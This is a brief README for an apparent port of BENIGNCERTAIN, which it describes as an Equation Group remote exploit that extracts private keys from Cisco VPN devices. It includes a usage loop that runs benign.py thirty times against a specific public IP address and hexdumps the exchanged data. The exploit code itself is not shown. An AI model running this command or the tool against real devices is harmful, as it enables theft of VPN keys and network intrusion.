# benigncertain
Simple exploit test for benigncertain (Equation Group's BENIGNCERTAIN tool - a remote exploit to extract Cisco VPN private keys) 
The port is based on the code from https://github.com/ross-bradley/benign-certain 

## Usage
```
for i in {1..30}; do python benign.py -n 1024 -o outfile -i intest 193.127.189.251  && echo "***RESPONSE***" && hexdump -C outfile  && echo "***REQUEST***" &&hexdump -C intest ; done
```

The response and request should contain different data 
